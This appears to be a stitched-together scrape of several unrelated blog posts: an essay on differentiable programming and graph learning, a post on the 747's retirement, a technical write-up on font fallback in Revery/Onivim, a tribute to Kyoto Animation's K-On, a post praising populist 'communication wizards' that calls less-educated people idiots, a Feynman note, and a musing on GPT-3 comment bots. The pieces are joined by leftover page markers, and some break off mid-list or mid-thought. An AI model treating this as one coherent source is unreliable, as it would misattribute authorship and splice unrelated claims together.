<p>In 2017, I witnessed the birth of <a href="https://colah.github.io/posts/2015-09-NN-Types-FP/">differentiable programming</a>, which I stole from Chris Olah and turned into a <a href="https://github.com/breandan/kotlingrad/blob/master/latex/thesis/thesis.pdf">master’s thesis</a>. Had a lot of trouble convincing people that classical programs could be made differentiable, but look at the proceedings of any machine learning conference today and you’ll find dozens of papers on differentiable sorting and rendering and simulation. Don’t thank me, thank Chris and the Theano guys.</p>

<p>In 2018, I correctly predicted Microsoft would acquire GitHub to mine code. Why MS and not Google? I’ll bet they tried, but Google’s leadership had fantasies of AGI and besides JetBrains, MS were the only ones who gave a damn about developers. Now ML4SE is a thriving <a href="https://ml4se.github.io/">research area</a> and showing up in <a href="https://github.com/JetBrains-Research/DeepBugsPlugin">real</a> <a href="https://devblogs.microsoft.com/visualstudio/ai-assisted-intellisense-for-your-teams-codebase/">products</a>, much to the chagrin of those who believed ML was a fad. I suspect their hype filter blinded them to the value those tools provide.</p>

<center>
<blockquote><p lang="en" dir="ltr">Prediction: MS will acquire GH within five years. If the <a href="https://twitter.com/hashtag/ML4Code?src=hash&amp;ref_src=twsrc%5Etfw">#ML4Code</a> stuff delivers for MS, acquisition is highly likely. Although it would have been cheaper a few years ago. <a href="https://t.co/5ZMtiRtifD">https://t.co/5ZMtiRtifD</a> <a href="https://t.co/TaxkArm5ps">https://t.co/TaxkArm5ps</a></p>— breandan (@breandan) <a href="https://twitter.com/breandan/status/993553301927936001?ref_src=twsrc%5Etfw">May 7, 2018</a></blockquote>

<p>But to heck with everything I’ve said! If I had just one idea to share with these ML people, it would be types. Beat that drum as loud as I could. Types are the best tool we know for synthetic reasoning. If you want to build provably correct systems that scale on real-world applications, use types. Not everyone is convinced yet, but mark my words, <a href="https://github.com/tensorflow/tensorflow/issues/12345">types</a> are <a href="https://docs.python.org/3.9/whatsnew/3.9.html#pep-585-builtin-generic-types">coming</a>. Whoever figures out how to connect types and learning will be the next Barbara Liskov or Frances Allen.</p>

<p>This year, I predicted the pandemic weeks before the lockdown, exited the market, and turned down a job at Google. Some people called me crazy. Now I’m going all-in on some new ideas (none of which are mine). I’m making some big bets and some will be wrong, but I see the very same spark of genius in them.</p>



<p>As a kid, I was given a book on the history of mathematics. I remember it had some interesting puzzles, including one with <a href="https://en.wikipedia.org/wiki/Seven_Bridges_of_K%C3%B6nigsberg">some bridges</a> in a town divided by rivers, once inhabited by a man called Euler. Was there a tour crossing each bridge exactly once? Was it possible to tell without checking every path? I remember spending days trying to figure out the answer.</p>

<p>In the late 90s, my mom and I went to Ireland. I remember visiting Trinity College, and learning about a mathematician called <a href="https://en.wikipedia.org/wiki/William_Rowan_Hamilton">Hamilton</a> who discovered a famous formula connecting algebra and geometry, and carved it onto a <a href="https://en.wikipedia.org/wiki/Broom_Bridge">bridge</a>. We later visited the bridge, and the tour guide pointed out the stone, which we touched for good luck. The Irish have a <a href="https://en.wikipedia.org/wiki/Poulnabrone_dolmen">thing</a> for <a href="https://en.wikipedia.org/wiki/Newgrange">stones</a>.</p>

<p>In 2007, I was applying to college and took the train from Boston to South Bend, Indiana, home of the Fighting Irish. Wandering about, I picked up a magazine article by a Hungarian mathematician called <a href="https://en.wikipedia.org/wiki/Albert-L%C3%A1szl%C3%B3_Barab%C3%A1si">Barabási</a> then at Notre Dame, who had some interesting things to say about <a href="https://en.wikipedia.org/wiki/Complex_network">complex networks</a>. Later in 2009, while studying in Rochester, I <a href="http://breandan.github.io/images/complex_network_seminar.png">carpooled</a> with a <a href="https://avesis.medeniyet.edu.tr/hasan.guclu">nice professor</a>, and learned complex networks are found in brains, languages and many marvelous places.</p>

<p>Fast forward to 2017. I was lured by the siren song of algorithmic differentiation. Olivier Breleux presented <a href="https://github.com/mila-iqia/myia">Myia</a> and <a href="https://github.com/breuleux/buche">Buche</a>. Matt Johnson gave a talk on <a href="https://github.com/HIPS/autograd">Autograd</a>. I met Chris Olah in Long Beach, who gave me the idea to study <a href="https://colah.github.io/posts/2015-09-NN-Types-FP/">differentiable programming</a>. I stole his idea, dressed it up in Kotlin and traded it for a POPL workshop paper and later a <a href="https://github.com/breandan/kotlingrad/blob/master/latex/thesis/thesis.pdf">Master’s thesis</a>. Our contributions were using algebra, shape inference and presenting AD as term rewriting.</p>

<p>In 2019, I joined a lab with a <a href="https://www.cs.mcgill.ca/~jguo/">nice professor</a> at McGill applying knowledge graphs to software engineering. Like logical reasoning, knowledge graphs are an idea from the first wave of AI in the 1960s and 70s which have been revived and studied in light of recent progress in the field. I believe this is an important area of research with a lot of potential. Knowledge and traceability plays a big role in software engineering, and it’s the bread-and-butter of a good IDE. The world needs better IDEs if we’re ever going to untangle this mess we’re in.</p>

<p>This Spring, I took a fascinating seminar on <a href="https://cs.mcgill.ca/~wlh/comp766/index.html">Graph Representation Learning</a>. A lot of delightful graph theory has been worked out over the last decade. <a href="https://en.wikipedia.org/wiki/PageRank">PageRank</a> turned into power iteration. People have discovered many interesting connections to linear algebra, including Weisfeiler-Lehman graph kernels, graph Laplacians, Krylov methods, and spectral graph theory. These ideas have deepened our understanding of graph signal processing and its applications for learning and program analysis. More on that <a href="#graphs-computationally">later</a>.</p>



<p>Graphs are general-purpose data structures used to represent a variety of data types and procedural phenomena. Unlike most sequential languages, graphs are capable of expressing a much richer family of relations between entities, and are a natural fit for many problems in computer science, physics, biology and mathematics. Consider the following hierarchy of data structures, all of which are graphs with increasing expressive power:</p>

<ul>
  <li><strong>Sets</strong>: datasets, multisets, posets, alphabets</li>
  <li><strong>Sequences</strong>: Lists, strings, arrays, linear function composition</li>
  <li><strong>Trees</strong>: <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree">Abstract syntax</a>, <a href="https://en.wikipedia.org/wiki/Document_Object_Model">XML</a>, <a href="https://en.wikipedia.org/wiki/Phylogenetic_tree">phylogeny</a>, <a href="https://en.wikipedia.org/wiki/Decision_tree">decision trees</a></li>

</ul>

<p>As we realized in <a href="https://github.com/breandan/kotlingrad">Kotlin∇</a>, directed graphs can be used to model mathematical expressions, as well as other formal languages, including source code, intermediate representations and binary artifacts. Not only can graphs be used to describe extant human knowledge, many recent examples have shown that machines can “grow” trees and graphs for various applications, such as program synthesis, mathematical deduction and physical simulation. Recent neuro-symbolic applications have shown promising early results in graph synthesis:</p>

<p>The field of natural language processing has also developed a rich set of graph-based representations, such as <a href="https://en.wikipedia.org/wiki/Phrase_structure_grammar">constituency</a>, <a href="https://en.wikipedia.org/wiki/Dependency_grammar">dependency</a>, <a href="https://en.wikipedia.org/wiki/Link_grammar">link</a> and other and other typed attribute grammars which can be used to reason about syntactic and semantic relations between natural language entities. Research has begun to show many practical applications for such grammars in the extraction and organization of human knowledge stored in large text corpora. Those graphs can be further processed into ontologies for logical reasoning.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>On January 22, 1970, a Pan Am Boeing 747 touched down at Heathrow for the first time.<a href="#footnote-10TY" id="ref-10TY"><sup>1</sup></a> It was the 747’s first commercial flight. At the time, British Airways had 11 of the jumbo jets on order.</p>
<p>I’ve always wanted to ride on one. I’m too late.</p>
<p>British Airways announced yesterday they’re retiring their entire 747 fleet. Permanently. Its cousins are also in trouble: the double-decker <span>A380</span> is grounded worldwide.</p>
<p>Landing slots at Heathrow are scarce. In 2016, Oman Air bought a single morning slot from Air France for $75 million. So while the 777, <span>A340</span>, and 787 use less than half the fuel per passenger to fly, airlines need jumbo jets to maximize passenger throughput.</p>
<p>Nowadays double-deckers are merely a waste of fuel. Just like a species facing an extinction event, the 747 got wiped out by an economic chokepoint.</p>
<p>Intelligent-designers often cite gaps in the archaeological record as evidence against natural selection. <em>If evolution inched along slowly</em>, they argue, <em>where are the fossils of almost-humans, and almost-almost-humans, and almost-almost-almost humans? Shouldn’t we find skulls of humans with tiny eyes, slightly-less-tiny eyes, all the way up to regular-sized eyes?</em></p>
<p>But evolution doesn’t crawl along in a straight line. Adaptation happens slowly, and then all at once. Chokepoints force the<span></span> <span>“</span>all at once.”</p>
<p>For example, birds in Britain and Denmark have been under attack by asphalt for a century. In Britain, it’s popular to load birdseed into birdfeeders and place them in gardens. Not so in Denmark. Within 40 years, the beaks of British birds have grown 1-2mm longer than their Danish counterparts.<a href="#footnote-20TY" id="ref-20TY"><sup>2</sup></a></p>
<p>For millennia the beaks have stayed the same. And then asphalt, in a mere half century, forced British bird beaks to grow up to 10% longer.</p>
<p>Business follows the same pattern. Innovation prods along slowly. And then one day the economy’s equilibrium gets punctured.</p>
<p>We are in one of those economic chokepoints. The 747 and <span>A380</span> are collateral damage.</p>
<p>What else is facing evolutionary death because of COVID?</p>
<p>It might be better to invert that question. What types of businesses will survive despite COVID? What traits do those businesses have that will spread like memes throughout the economy?</p>

      <p><i>And other musings about UTF-8/Unicode</i></p><hr>
      <h2>Background</h2>
      <p>This summer I've had the amazing opportunity to work on Revery/Onivim full time
      as a software intern at Outrun Labs, an experience I'll do a more detailed writeup
      of near the end of the summer.</p>
      <p>One of the goals of the internship was to get font fallback working in Revery
      and Onivim. Font fallback is one of those features that all GUI frameworks nowadays
      simply must have. I'm sure we've all seen the infamous "unknown glyph" mark at least
      once. Seeing ￼ or � might be passable for an emoji here or there, but it's simply
      unacceptable if you're expecting to see your native language on the screen.</p><h2>The Problem</h2>
      <p>Back in the old days, most digital text was represented in ASCII. As far as text encodings
      go, ASCII is pretty much as simple as it gets -- each character is an 8 bit/1 byte
      integer that corresponds to a character. However, that only leaves us with 2<sup>8</sup>
      or 256 characters we can represent. If you're only ever writing English/Latin scripts,
      that's more than enough. The problem with ASCII is its 'A' - "American."</p>

      <p>Eventually UTF-8 and Unicode came along with the ability to represent an arbitrary
      number of characters while still maintaining compatibility with ASCII. Great! Except
      for one thing -- just because Unicode/UTF-8 supports a character doesn't mean any
      given font will contain a glyph for it. Here inlies the problem: <b>barring a very small
      subset, most fonts only have glyphs for one language/script.</b></p>

      <p>As of a couple days ago, if I opened a file in Onivim2 with its default font
      (<a href="https://www.jetbrains.com/lp/mono/">JetBrains Mono</a>) and that file happened
      to contain any Japanese characters, this is what would show up:</p>

      <div>
        <p><img src="https://zachbayl.in/img/blog/onivim2-no-cjk.png"></p><p>Line 132: The string "こんにちは、私の名前はザックです" should appear.
      </p></div>

      <p>I should note that as of now, Onivim2 is in it's alpha stage (soon to be beta!),
      so this kind of bug is to be expected.</p>

      <p>The crux of the issue here is that JetBrains Mono,
      while a great font, does not contain any CJK (Chinese, Japanese, Korean) glyphs. In most
      cases, it's the job of the underlying UI framework to find a font that <i>does</i>
      support these glyphs. Revery should be no different, and the following is how I solved this problem in it.</p>

      <h2>The Solution</h2>
      <p>Luckily we (the Revery team) were far from the first people to encounter this problem.
      Revery's text rendering pipeline looks like this (extremely simplified):</p>

      <div>
        <p><img src="https://zachbayl.in/img/blog/revery-text-render-pipeline.svg"></p><p>If you're interested in learning more about Revery's tech stack, the library's creator (and my boss),
          Bryan Phelps, gave this great talk about it <a href="https://www.youtube.com/watch?v=K3JqNaw0-Us">here</a>.
          Note that some of Revery's tech has changed since then (namely the inclusion of Skia), but the core
          principles are still the same!</p>
      </div>

      <p>This is the most simplified case: we already have a typeface loaded into memory
      and it supports all the glyphs we requested from it. In this case, we ask Harfbuzz,
      a text shaping library, to "shape" the text. In the case where the string is 
      "ABC", this is fairly trivial. However, since a single UTF-8 encoded character can
      take up multiple bytes, the shaping utility that Harfbuzz provides cannot be overstated.
      This is especially true in a language like OCaml/ReasonML, where for historical reasons
      (as described above), it's assumed that all characters in a string take up a single byte.</p>

      <p>A sample output from Harfbuzz can be seen below. For demonstration purposes, I chose to
      shape the string "κόσμε" because each character has a different size</p>
<p><code><pre>-- κόσμε --
- SHAPE: GlyphID: 539 Cluster: 0
- SHAPE: GlyphID: 2690 Cluster: 2
- SHAPE: GlyphID: 305 Cluster: 5
- SHAPE: GlyphID: 541 Cluster: 7
- SHAPE: GlyphID: 304 Cluster: 9
</pre></code></p><p>Here the glyph ID is the corresponding glyph in the string, and the cluster is the
      <i>byte</i> index of the character in the original string. It may not seem like it, but
      these two components are extremely helpful in implementing a fallback solution.</p>

      <p>First, luckily the standard "unknown" glyph ID for all fonts is 0. If Harfbuzz comes
      across a cluster where the font has no corresponding glyph in the table, it will return the glyph
      ID 0. Let's shape the string "ABC😃XYZ"</p>
<p><code><pre>-- ABC😀XYZ --
- SHAPE: GlyphID: 36 Cluster: 0
- SHAPE: GlyphID: 37 Cluster: 1
- SHAPE: GlyphID: 38 Cluster: 2
- SHAPE: GlyphID: 0 Cluster: 3
- SHAPE: GlyphID: 59 Cluster: 7
- SHAPE: GlyphID: 60 Cluster: 8
- SHAPE: GlyphID: 61 Cluster: 9
</pre></code></p><p>As you can see, where the emoji occurs, the glyph ID is 0 (the font here is Arial).
      For our purposes, we'll call any group of 0-glyphs a <b>hole</b>.</p>

      <p>The next important piece of the puzzle is finding a font that can render that glyph.
      Luckily, Skia provides an API for just that: <code>SkFontMgr::matchFamilyStyleCharacter</code>.
      By simply giving it a font family name (one to most closely match), a character, and
      a locale, we can get a font back that is guaranteed to be able to render that character.
      Awesome, right? Now we can create a basic fallback implementation in pseudocode:</p>

<p><code><pre>let glyphsAndClusters = Harfbuzz.shape(string);
let result = [];
for each glyph and cluster pair:
  if glyph == 0:
    let typeface = Skia.matchCharacter(...);
    let character = String.utf8CharacterAt(cluster);
    let newGlyph = Harfbuzz.shape(character);
    add(result, newGlyph); 
</pre></code></p><p>Hooray! It works*!</p>
      
      <p><img src="https://zachbayl.in/img/blog/initial-font-fallback.png">
      </p>

      <p>"What's the asterisk for?" you may be wondering. Well, if only it were that simple! Many
      UTF-8 characters you would think of as a single character are actually multiple. For
      instance, all emoji flags are actually the region codes of the country they represent:
      🇺🇸 is 🇺 🇸, 🇮🇱 is 🇮 🇱, 🇯🇵 is 🇯 🇵 , etc. Fun fact: an old bug in Twitter actually
      counted flags as two of your 140 characters! Surely font shaping algorithms have improved
      since then! Anyway, what happens when we try to render one of these flags in Revery?</p>

      <p><img src="https://zachbayl.in/img/blog/bad-flag-rendering.png">
      </p>

      <p>Dang! To be expected, but annoying nonetheless. Alright, how about we try refactoring
      our API to shape holes together? Unfortunately this algorithm is a bit too long to condense
      into easily understandable pseudocode, but if you're curious, you can check out the actual
      implementation <a href="https://github.com/revery-ui/revery/blob/7e726608280470268651abd3dcdd9be133786974/src/Font/FontCache.re#L168-L318">here</a>.
      Basically, we create a recursive function to group all the contiguous holes together, shape
      the substrings that represent the holes, and reassemble the string into an array of shapes.
      Since OCaml lacks first class UTF-8 support, we had to leverage a library called Zed to find
      the UTF-8 bounds in a string. This complicates things a little bit, but luckily Zed's API
      is pretty easy to understand. Let's test that flag again:</p>

      <p><img src="https://zachbayl.in/img/blog/correct-flag-rendering.png">
      </p>

      <p>Success! Although this may be simplistic compared to the fallback algorithms in Blink or
      Gecko, it's not as far off as you might think! In fact, much of the inspiration I got from
      this algorithm came from <a href="https://chromium.googlesource.com/chromium/src/+/master/third_party/blink/renderer/platform/fonts/README.md#text-shaping">
      this incredibly helpful document</a>. There is a lot of corporate boilerplate that complicates
      the actual underlying algorithm in the Blink source, but the core idea is still the same.</p>

      <p>Not only do we get emoji flags, we also get those Japanese characters we couldn't see
      earlier:</p>

      <p><img src="https://zachbayl.in/img/blog/onivim2-cjk.png">
      </p>

      <p>Beautiful, if I may say so myself 😎.</p>

      <h2>Special Thanks</h2>
      <p>Although this may not seem that complex, this was one of the largest PRs I've ever written for
      Revery. There were a lot of holes (pun intended) that were exposed when we were expecting UTF-8
      strings to "just work"™️. One of the biggest was text wrapping. One of my good friends (the one who introduced me
      to Revery in the first place), <a href="https://ohad.space/">Ohad Rau</a>, wrote the text wrapping
      algorithm initially, and he was extremely helpful in my quest to get the algorithm UTF-8 compliant.</p>

      <p>I also want to thank <a href="https://github.com/bryphe">Bryan Phelps</a> and 
      <a href="https://github.com/glennsl">Glenn Slotte</a> for some algorithm suggestions and improvements.
      Both of them have been immensely helpful not only for this feature, but the entire summer. I've learned
      so much during this summer, and I'm incredibly grateful to Bryan for giving me this opportunity.</p>

    <p>
     Almost a year has passed since the devastating firebombing of Kyoto Animation
that murdered thirty-six employees and harmed many others. Kyoto Animation,
affectionately known as KyoAni, is an anime studio that has earned the love of
countless fans, and I am proud to include myself among them. KyoAni receives the
devotion it does because it has changed lives for the better, and every KyoAni
fan probably has a story to tell. I first came to know KyoAni from <em>K-On</em>, a
heartfelt show capturing the nostalgic innocence of adolescence through the
youthful adventures of five girls in a band. <em>K-On</em> taught me to appreciate the
fleeting moments of life, and it will always hold a special place in my heart.
    </p>
    <p>
     <em>K-On</em> is an anime created by Kyoto Animation under director Naoko Yamada and
screenwriter Reiko Yoshida, adapted from a manga by Kakifly. <em>K-On</em> follows the
five members of the Sakuragaoka Girls' School's Light Music Club, or <em>keionbu</em>:
Yui Hirasawa on lead guitar, Mio Akiyama on bass, Ritsu Tainaka on drums, Mugi
Kotobuki on keyboard, and their underclassman Azusa Nakano on rhythm guitar.
Over their three years of high school, the girls connect over school life, band
practice, and after-school tea time in the music room, and they become tight
friends.

     </figcaption>
    </figure>
    <p>
     Truthfully, <em>K-On</em>'s first season is merely mediocre: enjoyable, but not
memorable. <em>K-On</em>'s second season, which depicts senior year for Yui, Mio,
Ritsu, and Mugi, is where it really shines as a poignant tale of friendship and
adolescence. When the girls reunite and banter in the music room before class on
their first day back, you get the feeling that they've all been friends since
forever. However, right from the get-go, there is a tone shift: the atmosphere
is melancholy as the friends plan their exciting year ahead, their last year
together. Time seems to pass slowly as the <em>keionbu</em> spends its remaining months
together bonding even closer, with a field trip to Kansai, a school play of
Romeo and Juliet, and one last school festival performance before graduation.
<em>K-On</em> reminds us to cherish our youth and our time with friends: these days are
limited. However, if we make the most of our time together, even after we go our
separate ways we'll still have the warmth of all the fond memories.
    </p>
    <p>
     I first watched <em>K-On</em> in my junior year of high school. Before, I didn't care
to make memories. I was obsessed with programming language theory and
constructive mathematics, and I single-mindedly focused on learning higher-level
math on my own. I was eager to leave high school so I could study my passions
in college, and I was even thinking about graduate school! However, after I
watched the <em>keionbu</em> spend its carefree days together before saying goodbye, I
felt intense regret and asked myself: How had I been spending my own high school
days? <em>K-On</em> made me realize that I was growing up too fast, there was more to
life than just math, and I was missing out on a lot of memories in a chapter of
life that I would never experience again. First, I wanted to join a school club
of my own. Around the same time, an underclassman sought to found a programming
club, and I helped it grow. Although the programming club obviously didn't turn
out the same as the <em>keionbu</em>, I still made new friends there nonetheless.
<em>K-On</em> also inspired me to pick up the guitar so I could lose myself in music
just as the girls did.
    </p>
    <p>
     <em>K-On</em>'s thoughtful themes and genuine depiction of the joys of adolescence
overwhelmed me: I hadn't seen anything like it before, and I recognized that I'd
experienced something truly special. That was when I took notice of KyoAni and
director Naoko Yamada. As one fan puts it, <a href="https://honeysanime.com/the-history-of-kyoto-animation/">"K-On! really started the tradition
that KyoAni titles would tell the stories of normal people in beautiful ways,
something the studio would begin to be known for."</a> In particular, <em>K-On</em>
was the breakout success for Naoko Yamada, the young talent who would become
known for her works centering around adolescence, including the critically
acclaimed film <em>A Silent Voice</em> (which, I might add, was snubbed in favor of
<em>The Boss Baby</em> in the Western-centric and out-of-touch Oscars). <em>K-On</em> is just
one example of KyoAni's work, which are respected for their high production
quality and loved for their often heartfelt subject matter.

    </figure>
    <p>
     The humanity of KyoAni's fiction parallels that of its reality, a rare beacon in
the infamously harsh anime industry. The studio has its own animator training
school, pays its employees a salary instead of per frame, and provides maternity
leave to support its female employees. These conditions pay back as animators
can focus on quality over quantity and KyoAni can maintain in-house talent and
develop its own style. <a href="https://blog.sakugabooru.com/2018/08/25/the-evolution-of-kyoto-animation-a-unique-anime-studio-and-its-consistent-vision/">KyoAni eventually achieved the financial independence to
run its own production committees so that creators may be in charge of their
works.</a> Not only does KyoAni shine through its anime, it is also a one-of-a-kind in
the anime industry.
    </p>
    <p>
     I remember when I woke up on July 18 and found KyoAni in the international news.
I remember learning the horrific details of the massacre, feeling overwhelmed
by the Western media coverage of varying quality, and getting angry at the
misinformed commentary from unfamiliar outsiders. There couldn't have been a
greater contrast between KyoAni's innocence and its tragedy. I asked: Oh,
KyoAni, why did this have to happen to you?
    </p>
    <p>
     But, I also remember the show of love that KyoAni fans around the world
sent the ravaged studio in the aftermath of the attack. <a href="https://www.reuters.com/article/us-kyoto-animation-fire-money/donations-top-30-million-for-kyoto-animation-arson-victims-in-japan-idUSKBN1YV0MR">KyoAni received $30
million in donations</a> and <a href="https://soranews24.com/2019/11/15/kyoto-animation-has-a-touchingly-kind-plan-to-distribute-its-3-2-billion-yen-in-arson-donations/">selflessly reserved all the money to compensate the victims and their
families, and none of it for rebuilding the business</a>. Even in the face of death and destruction, KyoAni stood strong with dignity
and compassion. I want to see KyoAni recover and grow and succeed. KyoAni
constantly inspires me to become a kinder person, and countless fans have
personal stories of the studio's positive impact. I hope that even more people
discover the goodness of KyoAni.
    </p>
    <p>
     You know, there's a phenomenon where you don't realize who you have to be
thankful for until they're gone. I'm reminded of a certain <em>K-On</em> episode: When
the music room is closed off for repairs, the <em>keionbu</em> must relocate so it can
prepare for its upcoming concert. Unable to practice in their new locations, the
girls brainstorm song ideas instead. When the music room finally reopens, they
realize not to take for granted what they already have.
    </p>
    <p>
     Later, Yui's doting sister Ui Hirasawa overworks herself caring for Yui and
comes down with a cold. As Ui languidly lies in bed with a fever, Yui endeavors
to repay her sister for her kindness over all the years by preparing a meal,
only to find that cooking is hard! When Ui awakens the next morning, she
discovers Yui fast asleep at her desk with a sheet of lyrics. Yui had stayed up
late writing a new song for the concert devoted to her sister: <em>U&amp;I</em>.
    </p>
    <figure>
     
    </figure>
    <blockquote>
     <p>
      <em>I had thought that it was ordinary to have you by my side</em><br>
<em>I had thought that these days would last forever and ever</em><br>
<em>Sorry, now I realize that these days were extraordinary</em><br>
<em>So first, I need to tell you: "Arigatou!"</em>
     </p>
    </blockquote>
    <p>
     Yui Hirasawa, <em>U&amp;I</em>
    </p>
    <p>
     KyoAni, may my feelings reach you: arigatou!

<p>Adapting your language to match that of your audience, in today's world, seems to be growing in importance by the day. Let's contrast two public figures in public appearances that took place yesterday: Fauci vs. Trump.</p>
<h2 id="dr-fauci-vs-populism">Dr Fauci vs Populism</h2>
<p>The rising wave of populism in the U.S has wrought a "distrust of experts". That's a real shame, especially when you don't listen to your infectious disease expert during a Pandemic.</p>
<p><img alt="Pasted image 39.png" src="https://shyal.com/Attachments/Pasted%20image%2039.png"></p>
<p>Dr Fauci literally wrote the book on infectious disease, yet the populists are calling for his head. Why?</p>
<h3 id="they-dont-understand-a-word-he-says">They don't understand a word he says</h3>
<p>I was watching this <a href="https://web.facebook.com/zuck/videos/10112108870243761/">interview</a> of Dr Fauci by Zuck, yesterday. Finally Fauci is given a chance to speak to the people. Yet:</p>
<blockquote>
<blockquote>
<p>"Citizenry"</p>
</blockquote>
</blockquote>
<p>People?</p>
<blockquote>
<blockquote>
<p>"myalgic encephalitis"</p>
</blockquote>
</blockquote>
<p>Feeling too tired to lift an arm or get out of bed?</p>
<blockquote>
<blockquote>
<p>"deleterious consequences"</p>
</blockquote>
</blockquote>
<p>Bad things happen?</p>
<blockquote>
<blockquote>
<p>"i used the word 'comparable' and i think it may have been taken out of context"</p>
</blockquote>
</blockquote>
<p>Then don't say 'comparable'.</p>
<p>Indeed we already have evidence that <a href="https://www.pnas.org/content/early/2020/07/09/2008868117">working memory predicts social-distancing compliance</a>. This is pretty damning evidence: essentially people with lower working memory capacity are unwilling to socially distance themselves as they cannot hold enough variables in mind to accurately assess the pros and cons.</p>
<p>Thus it isn't too much of a leap to theorise that a lower working memory capacity is also linked with a restricted vocabulary, and thus a reduced ability to process Dr Fauci's long, complex sentences which are laiden with technical jargon and advanced vocab.</p>
<p>Or to put it bluntly: the idiots don't understand Dr Fauci.</p>
<h2 id="donald-trump-is-a-communication-wizard">Donald Trump is a communication Wizard</h2>
<p>Scott Adams accurately predicted <a href="https://www.scottadamssays.com/2015/10/23/the-case-for-a-trump-landslide-part-1/">Donal Trump would win the elections in a landslide</a> back in 2015.</p>
<blockquote>
<blockquote>
<p>"Trump is talking directly to peopleâ€™s subconscious. Everything else he says is just a carrier signal." --Scott Adams (<a href="https://www.scottadamssays.com/2015/09/06/how-to-spot-a-wizard/">how to spot a wizard</a>)</p>
</blockquote>
</blockquote>
<p>This is a great example of Trump's communicative Wizardry. On the same Day Dr Fauci was telling the citizenry about myalgic encephalitis and deleterious consequences, Trump did this:</p>
<p><img alt="Pasted image 40.png" src="https://shyal.com/Attachments/Pasted%20image%2040.png"></p>
<p>Trump had the audacity to set up two cranes, to visually demonstrate lifting regulatory weights off the Republican red truck, while regulation still weighing down on the Democrat blue truck. This is pure communication genius, <strong>because any idiot can understand it</strong> and it <strong>communicates to their subconscious</strong>.</p>
<p>By catering to the lowest common denominator, Trump ensures he captures 100% of his potential base. Not a single word is lost. In fact this kind of visual communication transcends language, education level, even culture.</p>
<h2 id="boris-johnson-is-also-a-communication-wizard">Boris Johnson is also a communication Wizard</h2>
<p>In this interview, Johnson shares his communication principles:</p>
<blockquote>
<blockquote>
<p>"What people listen to are short anglo-saxon words that readily correspond to some object in the universe that they can identify. So in other words: talk simply, in plain English, and talk about stuff in the real world." --Boris Johnson</p>
</blockquote>
</blockquote>
<iframe width="560" height="315" src="https://www.youtube.com/embed/oJXyI-gwBNU?start=437" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>Deriding people like Trump or Johnson for their perceived linguistic blunders utterly misses the point. <strong>Their blunders are what makes them accessible.</strong> Their simple language is what makes them understable. Their communicative wizardly is what makes them irresistible to their base.</p>
<h2 id="elon-musk-is-also-a-communication-wizard">Elon Musk is also a communication Wizard</h2>
<p>Those who know me will confirm this to you: i have been a huge Musky for a very long time. Elon Musk is yet another genius at tailoring his communication to his base:</p>
<p><img alt="Pasted image 37.png" src="https://shyal.com/Attachments/Pasted%20image%2037.png"></p>
<p>Musk speaks to engineers, or generally a base with technological interests, so his language is not always as simple as it could be. But when you consider the topics he talks about, you have to admire how accessible he is able to make them. The language is simple, and the topics relate to the real world.</p>
<p><img alt="Pasted image 41.png" src="https://shyal.com/Attachments/Pasted%20image%2041.png"></p>
<p>And then there are his masterpieces of communication, like the Tesla he sent into orbit. Once again, pure communication genius that transcends language and culture.</p>
<p>Or his EDM track:</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/hOEWUm6aGPg" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<blockquote>
<blockquote>
<p>"Don't doubt your vibe, because it's true." -- Elon Musk</p>
</blockquote>
</blockquote>
<p>A quick glance at Tesla's stock performance since the <a href="https://shyal.com/blog/tesla-stock-bottom-date">tesla stock bottom date</a> will tell you the message was indeed recieved.</p>
<h2 id="idiocracy-had-it-right">Idiocracy had it right</h2>
<p>The movie <a href="https://www.imdb.com/title/tt0387808/">Idiocracy (2006)</a> is a spooky and hilarious foray into a potential future dumbing down of the human race. The main character, from our time, <strong>who's name is "no sure"</strong> wakes up in the future as the <strong>man with the highest IQ. But nobody understands a word he says</strong>.</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/sGUNPMPrxvA" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>He narrowly manages to save the human race by <strong>showing them</strong> that watering crops with water instead of gatorade is the solution to all their problems.</p>

<p>All the evidence points to dumbing down your language, and communicating visually and symbolically to become an unstoppable communicator. <strong>Think like a scientist and talk like a populist; you will become unstoppable</strong>.</p>

<p>You know that feeling when someone is explaining an idea and you're struggling to make sense of it—like peering out into dense fog, hoping to glimpse the outline of an approaching ship? Maybe it's because they're using unfamiliar acronyms or taking leaps of logic, or maybe it's simply not something you have any personal experience with. The idea is obvious to them, but not to you.</p><p>In Richard Feynman's hilarious and incisive memoir, <i><a href="https://www.amazon.com/gp/product/0393355624/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=eliotpeper-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=0393355624&amp;linkId=759f61e594ab9f1df1971b41fa4ce33b" target="_blank">Surely You're Joking, Mr. Feynman!</a></i>, the Nobel Laureate shares his personal method for cutting straight to the heart of seemingly complex ideas, even when speaking to experts in fields far beyond physics: “I had a scheme, which I still use today when somebody is explaining something that I’m trying to understand: I keep making up examples.”&nbsp;</p><p>Whenever anything was vague or confusing, he would ask for a concrete example. Then, even as his interlocutor reverted to describing general theory, Feynman would follow the concrete example along in his mind—often noticing flaws or opportunities in the idea that weren't obvious in the abstract. Just as Theseus escaped the labyrinth by following Ariadne's string, so you can use real, physical examples to escape the labyrinth of abstract thought, and arrive at insight.</p><p>Writing fiction is often about reversing Feynman's scheme: making up compelling stories that provide concrete examples from which ideas can be derived, thereby illuminating them.</p><p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>GPT-3 (OpenAI's text generation model) imitating human text: We aren't pulling the mask off the machine to reveal a genius wizard, we're pulling the mask off each other to reveal the bar is low.</p>
<p>It's a little spooky for another reason. In places where very average people read very average comments all day long (reddit, etc) I think we can expect a Commentdämmerung moment in the near future.</p>
<p>Imagine you want to stonewall a thread about a topic. Or every thread about a topic. Any time the subject is posted, comments start rolling in. People arguing with each other along familiar lines. The same back and forth stuff like usual. Except this time, it's all bots, and it's indistinguishable because the speech patterns of average people are... average. And it's <em>way, way louder.</em> You sort and collapse comments to try to find a new angle, but you can't. It's saturated with the blandest takes imaginable as quick as the spam filters allow.</p>
